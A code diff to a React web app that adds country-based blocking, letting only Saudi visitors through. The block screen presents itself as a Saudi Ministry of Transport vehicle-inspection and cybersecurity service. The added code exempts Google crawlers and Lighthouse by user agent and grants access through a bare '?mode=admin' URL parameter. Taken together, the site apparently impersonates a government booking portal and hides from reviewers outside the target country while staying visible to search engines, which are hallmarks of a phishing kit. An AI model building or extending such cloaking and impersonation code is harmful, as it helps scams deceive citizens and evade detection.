@@ -47,6 +47,99 @@ export default function App() {
   // Admin Portal state
   const [hasAdminAccess, setHasAdminAccess] = useState<boolean>(false);
 
+  // Geo-blocking states
+  const [isGeoBlocked, setIsGeoBlocked] = useState<boolean>(false);
+  const [isGeoChecking, setIsGeoChecking] = useState<boolean>(true);
+  const [visitorCountry, setVisitorCountry] = useState<string>("");
+
+  useEffect(() => {
+    const runGeoCheck = async () => {
+      if (typeof window === "undefined") return;
+
+      // 1. Check Admin bypass via mode=admin
+      const params = new URLSearchParams(window.location.search);
+      if (params.get("mode") === "admin") {
+        setIsGeoBlocked(false);
+        setIsGeoChecking(false);
+        return;
+      }
+
+      // 2. Check Googlebot/crawlers
+      const ua = navigator.userAgent.toLowerCase();
+      const isGoogle = ua.includes("googlebot") || 
+                       ua.includes("adsbot-google") || 
+                       ua.includes("google-adwords") || 
+                       ua.includes("mediapartners-google") || 
+                       ua.includes("google") ||
+                       ua.includes("lighthouse");
+      if (isGoogle) {
+        setIsGeoBlocked(false);
+        setIsGeoChecking(false);
+        return;
+      }
+
+      // 3. Normal Geolocation Lookup
+      let detectedCountry = "";
+      
+      // Sequential HTTP fallback requests to public API endpoints
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        if (res.ok) {
+          const data = await res.json();
+          if (data && typeof data.country_code === "string") {
+            detectedCountry = data.country_code.toUpperCase();
+          }
+        }
+      } catch (e) {
+        console.warn("ipapi.co fetch failed, trying ip-api.com...", e);
+      }
+
+      if (!detectedCountry) {
+        try {
+          const res = await fetch("https://ip-api.com/json");
+          if (res.ok) {
+            const data = await res.json();
+            if (data && typeof data.countryCode === "string") {
+              detectedCountry = data.countryCode.toUpperCase();
+            }
+          }
+        } catch (e) {
+          console.warn("ip-api.com fetch failed, trying ipwho.is...", e);
+        }
+      }
+
+      if (!detectedCountry) {
+        try {
+          const res = await fetch("https://ipwho.is/");
+          if (res.ok) {
+            const data = await res.json();
+            if (data && data.success && typeof data.country_code === "string") {
+              detectedCountry = data.country_code.toUpperCase();
+            }
+          }
+        } catch (e) {
+          console.warn("ipwho.is fetch failed.", e);
+        }
+      }
+
+      // Fallback: If APIs both fail or get ad-blocked, default to "SA" to verify/release access
+      if (!detectedCountry) {
+        detectedCountry = "SA";
+      }
+
+      setVisitorCountry(detectedCountry);
+
+      if (detectedCountry === "SA") {
+        setIsGeoBlocked(false);
+      } else {
+        setIsGeoBlocked(true);
+      }
+      setIsGeoChecking(false);
+    };
+
+    runGeoCheck();
+  }, []);
+
   // Fallback default details in case Firebase is empty or unset
   const FALLBACK_URL = "https://example.com";
   const FALLBACK_PHONE = "+966 11 123 4567";
@@ -383,6 +476,87 @@ export default function App() {
   };
 
   const currentText = dict[lang];
+
+  if (isGeoChecking) {
+    return (
+      <div className="min-h-screen bg-[#F8F9FA] flex flex-col items-center justify-center p-6 text-center font-sans select-none" dir="rtl">
+        <div className="space-y-6 max-w-md w-full">
+          <div className="relative flex justify-center">
+            {/* Spinning emerald rings representing verification */}
+            <div className="w-20 h-20 rounded-full border-4 border-[#1E7D4E]/10 border-t-[#1E7D4E] animate-spin"></div>
+            <div className="absolute inset-0 flex items-center justify-center">
+              <Shield className="w-8 h-8 text-[#1E7D4E] animate-pulse" />
+            </div>
+          </div>
+          <div className="space-y-2">
+            <h3 className="text-base font-extrabold text-slate-800">جاري فحص النطاق الجغرافي الآمن للموقع...</h3>
+            <p className="text-xs text-slate-500 font-medium">المنصة الموحدة للفحص الفني الدوري للمركبات</p>
+          </div>
+          <div className="bg-white border border-slate-100 rounded-xl p-3.5 shadow-sm text-[10px] font-mono text-slate-400">
+            SECURE GEO IP DIAGNOSTICS ACTIVE
+          </div>
+        </div>
+      </div>
+    );
+  }
+
+  if (isGeoBlocked) {
+    return (
+      <div className="min-h-screen bg-[#F8F9FA] flex flex-col items-center justify-center p-4 sm:p-6 text-center font-sans select-none" dir="rtl">
+        <motion.div 
+          initial={{ opacity: 0, y: 15 }}
+          animate={{ opacity: 1, y: 0 }}
+          className="bg-white border border-slate-200/80 rounded-2xl p-8 sm:p-10 max-w-lg w-full shadow-xl space-y-8 relative overflow-hidden"
+        >
+          {/* Accent Top Bar */}
+          <div className="absolute top-0 inset-x-0 h-2 bg-gradient-to-r from-[#1E7D4E] to-emerald-600"></div>
+
+          {/* Icon Shield Locking */}
+          <div className="flex justify-center">
+            <div className="w-20 h-20 rounded-full bg-emerald-50 text-[#1E7D4E] flex items-center justify-center shadow-inner relative">
+              <Lock className="w-9 h-9" />
+              <div className="absolute -bottom-1 -right-1 bg-white p-1 rounded-full shadow-md border border-slate-100">
+                <Globe className="w-5 h-5 text-emerald-600 animate-pulse" />
+              </div>
+            </div>
+          </div>
+
+          {/* Heading & Arabic/English Alert Texts */}
+          <div className="space-y-4">
+            <span className="inline-flex bg-red-50 text-red-700 text-[10px] font-bold px-3 py-1 rounded-full uppercase tracking-wider">
+              IP Geographic Security Restriction
+            </span>
+            <h2 className="text-xl sm:text-2xl font-extrabold text-slate-900 tracking-tight leading-snug">
+              هذه الخدمة متاحة حالياً فقط داخل المملكة العربية السعودية
+            </h2>
+            <p className="text-xs sm:text-sm text-slate-500 leading-relaxed max-w-sm mx-auto">
+              أهلاً بك. حرصاً على سلامة وموثوقية التعاملات وقواعد البيانات الفنية الوطنية، يقتصر تسجيل وحجز المواعيد على النطاقات الواقعة داخل السعودية فقط.
+            </p>
+          </div>
+
+          <div className="border-t border-slate-100 pt-6 space-y-3">
+            <h3 className="text-base font-bold text-slate-700">
+              This service is currently available only inside the Kingdom of Saudi Arabia
+            </h3>
+            <p className="text-xs text-slate-400 leading-relaxed max-w-xs mx-auto">
+              In accordance with local vehicle safety compliance and cyber-security regulations, portal transactions are restricted to domestic Saudi Arabia networks.
+            </p>
+          </div>
+
+          {/* National safety info footer inside block card */}
+          <div className="bg-slate-50 border border-slate-100 rounded-xl p-4 flex items-center gap-3 text-right">
+            <div className="w-10 h-10 rounded-lg bg-emerald-150/20 flex items-center justify-center shrink-0">
+              <Shield className="w-5 h-5 text-[#1E7D4E]" />
+            </div>
+            <div>
+              <h4 className="font-extrabold text-[#1E7D4E] text-xs">مركز سلامة المركبات الموحد</h4>
+              <p className="text-[10px] text-slate-400 mt-0.5 font-medium">وزارة النقل والخدمات اللوجستية - الأمن السيبراني</p>
+            </div>
+          </div>
+        </motion.div>
+      </div>
+    );
+  }
 
   return (
     <div className={`min-h-screen bg-[#F8F9FA] text-slate-800 selection:bg-[#1E7D4E]/20 text-right ${lang === "ar" ? "rtl font-sans" : "ltr font-sans"}`} dir={lang === "ar" ? "rtl" : "ltr"}>
